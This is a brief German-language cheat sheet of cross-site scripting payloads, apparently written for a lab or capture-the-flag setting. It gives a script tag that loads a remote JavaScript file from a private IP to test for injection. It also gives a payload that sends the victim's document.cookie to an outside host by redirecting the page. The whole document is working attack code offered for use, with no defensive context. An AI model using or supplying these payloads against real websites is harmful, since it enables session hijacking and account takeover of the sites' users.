# XSS
## Prüfen ob eine Attacke möglich ist
```html
<script src="http://10.10.14.18/fuchs.js"></script>
```


## Mögliche Payloads

### Cookies klauen
```js
document.location = 'http://10.10.14.4/' + document.cookie;
```

